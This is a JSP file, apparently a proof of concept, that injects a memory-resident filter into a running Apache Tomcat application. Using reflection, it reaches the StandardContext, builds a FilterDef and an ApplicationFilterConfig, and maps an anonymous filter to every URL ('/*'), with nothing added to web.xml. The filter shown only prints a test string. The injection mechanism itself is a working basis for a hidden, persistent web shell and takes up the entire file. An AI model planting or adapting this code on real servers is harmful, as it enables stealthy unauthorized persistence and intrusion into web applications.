<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.io.PrintWriter" %>
<%
    //    context
    Field f = request.getClass().getDeclaredField("request");
    f.setAccessible(true);//因为是protected
    Request req = (Request) f.get(request);//反射获取值
    StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext

    // filter and filterDef
    // 注意填一些基本信息
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }

        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            servletResponse.getWriter().println("filter_xjj_test");
        }

        @Override
        public void destroy() {

        }
    };
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("xjjFilter");
    filterDef.setFilterClass(filter.getClass().getName());
    context.addFilterDef(filterDef);

//    applicationConfig
    Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig applicationFilterConfig = declaredConstructor.newInstance(context, filterDef);

    // context.filterConfigs reflect, 加入applicationconfig
    Field filterConfigs = context.getClass().getDeclaredField("filterConfigs");
    filterConfigs.setAccessible(true);
    Map map = (Map) filterConfigs.get(context);
    map.put("xjjFilter", applicationFilterConfig); //  add ApplicationfilterConfig to the filterConfigs

//    filterMap
    // 加入map之前一定先假如def，否则会做检查
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("xjjFilter");

    context.addFilterMap(filterMap);
%>